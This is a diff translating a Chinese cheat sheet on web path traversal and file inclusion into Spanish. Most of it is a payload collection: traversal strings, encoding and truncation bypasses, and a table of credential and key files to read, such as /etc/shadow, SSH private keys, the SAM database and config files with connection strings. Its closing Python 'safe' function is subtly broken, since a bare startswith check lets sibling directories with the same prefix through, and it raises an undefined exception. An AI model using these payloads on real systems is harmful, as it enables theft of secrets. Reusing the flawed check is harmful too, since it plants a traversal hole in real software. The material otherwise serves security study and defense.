@@ -1,117 +1,117 @@
-# Web 安全 - 文件遍历与文件包含
+# Seguridad Web - Traversal de archivos e inclusión de archivos
 
-> 来源: WooYun 漏洞库 | 拆自 web-file-infra.md
+> Fuente: Base de datos de vulnerabilidades WooYun | Extraído de web-file-infra.md
 
-## 二、文件遍历与文件包含
+## II. Traversal de archivos e inclusión de archivos
 
-### 2.1 漏洞本质
-
-```
-用户输入空间 -> [信任边界失效] -> 文件系统空间
-核心: 开发者认为"用户输入=文件名"，攻击者利用"用户输入=路径指令"
-```
-
-### 2.2 漏洞参数识别
-
-高频参数名(按出现频率):
+### 2.1 Naturaleza de la vulnerabilidad
 
 ```
-文件类: filename, filepath, path, file, filePath, hdfile, inputFile
-下载类: download, down, attachment, attach, doc
-读取类: read, load, get, fetch, open, input
-模板类: template, tpl, page, include, temp
-通用类: url, src, dir, folder, resource, name
+Espacio de entrada del usuario -> [Fallo del límite de confianza] -> Espacio del sistema de archivos
+Núcleo: el desarrollador asume que "entrada del usuario = nombre de archivo", el atacante lo explota como "entrada del usuario = instrucción de ruta"
 ```
 
-高危功能点(TOP 5):
-1. 文件下载接口 (27次) - `down.php, download.jsp`
-2. 文件预览功能 (17次) - `view.php, preview.jsp`
-3. 附件管理 (6次) - `attachment.php`
-4. 图片加载 (5次) - `pic.php, image.jsp`
-5. 日志查看 (4次) - `log.php, viewlog.jsp`
+### 2.2 Identificación de parámetros vulnerables
 
-### 2.3 目录遍历Payload
+Nombres de parámetros frecuentes (por frecuencia de aparición):
 
-基础遍历:
+```
+Tipo archivo: filename, filepath, path, file, filePath, hdfile, inputFile
+Tipo descarga: download, down, attachment, attach, doc
+Tipo lectura: read, load, get, fetch, open, input
+Tipo plantilla: template, tpl, page, include, temp
+Tipo genérico: url, src, dir, folder, resource, name
+```
+
+Puntos funcionales de alto riesgo (TOP 5):
+1. Interfaz de descarga de archivos (27 veces) - `down.php, download.jsp`
+2. Función de vista previa de archivos (17 veces) - `view.php, preview.jsp`
+3. Gestión de adjuntos (6 veces) - `attachment.php`
+4. Carga de imágenes (5 veces) - `pic.php, image.jsp`
+5. Visualización de logs (4 veces) - `log.php, viewlog.jsp`
+
+### 2.3 Payloads de traversal de directorios
+
+Traversal básico:
 
 ```bash
-../                          # Linux标准
-..\..\                       # Windows标准
+../                          # Estándar Linux
+..\..\                       # Estándar Windows
 ../../../../../../../etc/passwd
 ..\..\..\..\..\..\windows\win.ini
 ```
 
-编码绕过:
+Bypass mediante codificación:
 
 ```bash
-# URL单次编码
+# Codificación URL simple
 %2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/
 
-# URL双重编码
+# Doble codificación URL
 %252e%252e%252f  |  ..%252f
 
-# Unicode/UTF-8超长编码 (GlassFish特有)
+# Codificación Unicode/UTF-8 sobrelarga (específico de GlassFish)
 %c0%ae%c0%ae/%c0%af
 
-# 混合编码
+# Codificación mixta
 ..%2f  |  %2e%2e/  |  ..%c0%af
 ```
 
-特殊绕过:
+Bypass especial:
 
 ```bash
-# 空字节截断 (PHP<5.3.4 / Java旧版本)
+# Truncamiento con byte nulo (PHP<5.3.4 / versiones antiguas de Java)
 ../../../etc/passwd%00.jpg
 
-# 问号截断
+# Truncamiento con signo de interrogación
 ../../../WEB-INF/web.xml%3f
 
-# 路径混淆
+# Ofuscación de ruta
 ....//  |  ....\/  |  ..\/  |  ./../../
 
-# 绝对路径/协议绕过
+# Ruta absoluta/bypass de protocolo
 /etc/passwd
 file:///etc/passwd
 file://localhost/etc/passwd
 ```
 
-### 2.4 敏感文件路径速查表
+### 2.4 Tabla de referencia rápida de rutas de archivos sensibles
 
-Linux系统:
+Sistema Linux:
 
 ```bash
-/etc/passwd                    # 用户列表(验证首选)
-/etc/shadow                    # 密码哈希
-/etc/hosts                     # 主机映射
-/root/.ssh/id_rsa              # SSH私钥
-/root/.bash_history            # 命令历史
-/proc/self/environ             # 进程环境变量
-/etc/nginx/nginx.conf          # Nginx配置
-/etc/my.cnf                    # MySQL配置
+/etc/passwd                    # Lista de usuarios (opción preferida de verificación)
+/etc/shadow                    # Hashes de contraseñas
+/etc/hosts                     # Mapeo de hosts
+/root/.ssh/id_rsa              # Clave privada SSH
+/root/.bash_history            # Historial de comandos
+/proc/self/environ             # Variables de entorno del proceso
+/etc/nginx/nginx.conf          # Configuración de Nginx
+/etc/my.cnf                    # Configuración de MySQL
 ```
 
-Windows系统:
+Sistema Windows:
 
 ```bash
-C:\windows\win.ini             # 系统配置(验证首选)
-C:\boot.ini                    # 启动配置(XP/2003)
-C:\inetpub\wwwroot\web.config  # IIS应用配置
-C:\windows\system32\config\sam # SAM数据库
+C:\windows\win.ini             # Configuración del sistema (opción preferida de verificación)
+C:\boot.ini                    # Configuración de arranque (XP/2003)
+C:\inetpub\wwwroot\web.config  # Configuración de aplicación IIS
+C:\windows\system32\config\sam # Base de datos SAM
 ```
 
 Java Web:
 
 ```bash
-WEB-INF/web.xml                         # 核心配置(验证首选)
-WEB-INF/classes/jdbc.properties          # 数据库配置
-WEB-INF/classes/applicationContext.xml   # Spring配置
-WEB-INF/classes/hibernate.cfg.xml        # Hibernate配置
+WEB-INF/web.xml                         # Configuración central (opción preferida de verificación)
+WEB-INF/classes/jdbc.properties          # Configuración de base de datos
+WEB-INF/classes/applicationContext.xml   # Configuración de Spring
+WEB-INF/classes/hibernate.cfg.xml        # Configuración de Hibernate
 ```
 
-PHP应用:
+Aplicación PHP:
 
 ```bash
-config.php | config.inc.php | db.php | conn.php    # 通用配置
+config.php | config.inc.php | db.php | conn.php    # Configuración genérica
 wp-config.php                           # WordPress
 config_global.php | config_ucenter.php  # Discuz
 application/config/database.php         # CodeIgniter
@@ -120,26 +120,26 @@ application/config/database.php         # CodeIgniter
 ASP.NET:
 
 ```bash
-web.config                 # 核心配置(含连接字符串)
-../web.config              # 上级目录配置
+web.config                 # Configuración central (incluye cadena de conexión)
+../web.config              # Configuración del directorio superior
 ```
 
-### 2.5 防御措施
+### 2.5 Medidas de defensa
 
 ```python
 import os
 def safe_file_access(user_input, base_dir):
-    # 1. 路径规范化
+    # 1. Normalización de la ruta
     full_path = os.path.normpath(os.path.join(base_dir, user_input))
-    # 2. 验证在允许目录内
+    # 2. Verificar que esté dentro del directorio permitido
     if not full_path.startswith(os.path.normpath(base_dir)):
         raise SecurityError("Path traversal detected")
-    # 3. 白名单扩展名
-    # 4. 验证文件存在
+    # 3. Extensiones de lista blanca
+    # 4. Verificar la existencia del archivo
     return full_path
 ```
 
-关键原则: 路径规范化(realpath/normpath) -> 目录边界校验 -> 白名单验证 -> 最小权限运行
+Principio clave: normalización de ruta (realpath/normpath) -> verificación del límite de directorio -> validación por lista blanca -> ejecución con privilegios mínimos
 
 ---
 
